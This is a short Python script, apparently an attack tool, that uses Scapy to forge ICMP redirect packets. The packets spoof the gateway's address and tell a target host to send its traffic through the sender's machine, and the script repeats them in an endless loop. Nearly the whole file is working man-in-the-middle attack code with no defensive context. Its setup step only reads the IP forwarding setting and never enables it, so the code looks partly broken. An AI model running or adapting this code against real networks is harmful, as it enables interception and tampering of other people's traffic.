from scapy.all import IP, ICMP, UDP, get_if_addr, send, conf

class redirect:
    def __init__(self, target, gateway):
        self.target = target
        self.gateway = gateway
        self.interface = conf.iface

    def setup(self):
        open('/proc/sys/net/ipv4/ip_forward').read(1)

    def sendPacket(self):
        print("Beginning the redirect!")
        ipv4 = IP()
        ipv4.src = self.gateway
        ipv4.dst = self.target
        icmp = ICMP()
        icmp.type = 5
        icmp.code = 1
        icmp.gw = get_if_addr(self.interface)
        ipv4_2 = IP()
        ipv4_2.src = self.target
        ipv4_2.dst = self.gateway
        send(ipv4 / icmp / ipv4_2 / UDP(), loop=1, inter = 3, verbose = False)